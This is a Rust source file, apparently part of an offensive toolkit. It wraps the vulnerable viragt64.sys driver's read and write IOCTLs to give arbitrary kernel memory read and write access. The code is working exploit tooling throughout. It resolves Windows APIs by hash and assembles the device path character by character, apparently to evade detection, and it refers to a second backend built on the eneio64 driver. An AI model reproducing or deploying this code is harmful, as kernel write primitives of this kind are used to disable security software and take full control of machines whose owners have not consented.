//! Kernel read/write abstraction layer
//!
//! Trait-based design for driver backends:
//!   - ViragKernelRW: viragt64.sys (virtual memory IOCTL, direct R/W)
//!   - eneio64 mode uses DM_KernelSyscall instead (see eneio64.rs)

use crate::resolver::*;
use windows::Win32::Foundation::*;

// Type aliases for dynamically resolved functions
type FnCreateFileW =
    unsafe extern "system" fn(*const u16, u32, u32, *const u8, u32, u32, HANDLE) -> HANDLE;
type FnDeviceIoControl = unsafe extern "system" fn(
    HANDLE,
    u32,
    *const u8,
    u32,
    *mut u8,
    u32,
    *mut u32,
    *const u8,
) -> BOOL;
type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;

/// Kernel R/W trait — common interface for virtual memory driver backends
pub trait KernelRW {
    fn read_u8(&self, address: u64) -> Result<u8, String>;
    fn read_u32(&self, address: u64) -> Result<u32, String>;
    fn read_u64(&self, address: u64) -> Result<u64, String>;
    fn read_bytes(&self, address: u64, buf: &mut [u8]) -> Result<(), String>;
    fn write_u8(&self, address: u64, value: u8) -> Result<(), String>;
    fn write_u32(&self, address: u64, value: u32) -> Result<(), String>;
}

// ═══════════════════════════════════════════════════════════════════════════════
// viragt64.sys Backend — Virtual Memory IOCTL
// ═══════════════════════════════════════════════════════════════════════════════

const VIRAG_IOCTL_READ: u32 = 0x82730028;
const VIRAG_IOCTL_WRITE: u32 = 0x8273007C;

#[repr(C)]
#[derive(Clone, Copy)]
struct ViragReadRequest {
    address: u64,
    _pad: [u8; 16],
    length: u32,
    _pad2: [u8; 4],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ViragWriteRequest {
    dest_address: u64,
    value1: u64,
    value2: u64,
}

pub struct ViragKernelRW {
    device: HANDLE,
    fn_ioctl: FnDeviceIoControl,
    fn_close: FnCloseHandle,
}

impl ViragKernelRW {
    pub fn new(api: &ApiResolver) -> Result<Self, String> {
        let fn_create: FnCreateFileW = unsafe {
            std::mem::transmute(
                api.k32(HASH_CREATE_FILE_W)
                    .ok_or("Failed to resolve CreateFileW")?,
            )
        };
        let fn_ioctl: FnDeviceIoControl = unsafe {
            std::mem::transmute(
                api.k32(HASH_DEVICE_IO_CONTROL)
                    .ok_or("Failed to resolve DeviceIoControl")?,
            )
        };
        let fn_close: FnCloseHandle = unsafe {
            std::mem::transmute(
                api.k32(HASH_CLOSE_HANDLE)
                    .ok_or("Failed to resolve CloseHandle")?,
            )
        };

        // Device path: "\\.\viragtlt"
        let path: Vec<u16> = [
            '\\' as u16,
            '\\' as u16,
            '.' as u16,
            '\\' as u16,
            'v' as u16,
            'i' as u16,
            'r' as u16,
            'a' as u16,
            'g' as u16,
            't' as u16,
            'l' as u16,
            't' as u16,
            0u16,
        ]
        .to_vec();

        let device = unsafe {
            fn_create(
                path.as_ptr(),
                0xC0000000,
                0,
                std::ptr::null(),
                3,
                0x80,
                HANDLE::default(),
            )
        };
        if device.is_invalid() {
            return Err(format!(
                "Failed to open viragt64 device: error {}",
                unsafe { GetLastError().0 }
            ));
        }

        Ok(ViragKernelRW {
            device,
            fn_ioctl,
            fn_close,
        })
    }

    fn raw_read(&self, address: u64, buf: &mut [u8]) -> Result<(), String> {
        let req = ViragReadRequest {
            address,
            _pad: [0u8; 16],
            length: buf.len() as u32,
            _pad2: [0u8; 4],
        };
        let mut ret = 0u32;
        let ok = unsafe {
            (self.fn_ioctl)(
                self.device,
                VIRAG_IOCTL_READ,
                &req as *const _ as *const u8,
                std::mem::size_of::<ViragReadRequest>() as u32,
                buf.as_mut_ptr(),
                buf.len() as u32,
                &mut ret,
                std::ptr::null(),
            )
        };
        if !ok.as_bool() {
            return Err(format!("IOCTL kernel read failed at 0x{:016X}", address));
        }
        Ok(())
    }

    fn raw_write_2qword(&self, dest: u64, val1: u64, val2: u64) -> Result<(), String> {
        let req = ViragWriteRequest {
            dest_address: dest,
            value1: val1,
            value2: val2,
        };
        let mut ret = 0u32;
        let ok = unsafe {
            (self.fn_ioctl)(
                self.device,
                VIRAG_IOCTL_WRITE,
                &req as *const _ as *const u8,
                std::mem::size_of::<ViragWriteRequest>() as u32,
                std::ptr::null_mut(),
                0,
                &mut ret,
                std::ptr::null(),
            )
        };
        if !ok.as_bool() {
            return Err(format!("IOCTL kernel write failed at 0x{:016X}", dest));
        }
        Ok(())
    }

    fn write_rmw(&self, address: u64, data: &[u8]) -> Result<(), String> {
        let qword_addr = address & !7u64;
        let byte_offset = (address - qword_addr) as usize;
        let mut buf = [0u8; 16];
        self.raw_read(qword_addr, &mut buf)?;
        buf[byte_offset..byte_offset + data.len()].copy_from_slice(data);
        let val1 = u64::from_le_bytes(buf[0..8].try_into().unwrap());
        let val2 = u64::from_le_bytes(buf[8..16].try_into().unwrap());
        self.raw_write_2qword(qword_addr, val1, val2)
    }
}

impl KernelRW for ViragKernelRW {
    fn read_u8(&self, address: u64) -> Result<u8, String> {
        let mut buf = [0u8; 1];
        self.raw_read(address, &mut buf)?;
        Ok(buf[0])
    }

    fn read_u32(&self, address: u64) -> Result<u32, String> {
        let mut buf = [0u8; 4];
        self.raw_read(address, &mut buf)?;
        Ok(u32::from_le_bytes(buf))
    }

    fn read_u64(&self, address: u64) -> Result<u64, String> {
        let mut buf = [0u8; 8];
        self.raw_read(address, &mut buf)?;
        Ok(u64::from_le_bytes(buf))
    }

    fn read_bytes(&self, address: u64, buf: &mut [u8]) -> Result<(), String> {
        self.raw_read(address, buf)
    }

    fn write_u8(&self, address: u64, value: u8) -> Result<(), String> {
        self.write_rmw(address, &[value])
    }

    fn write_u32(&self, address: u64, value: u32) -> Result<(), String> {
        self.write_rmw(address, &value.to_le_bytes())
    }
}

impl Drop for ViragKernelRW {
    fn drop(&mut self) {
        unsafe {
            let _ = (self.fn_close)(self.device);
        }
    }
}
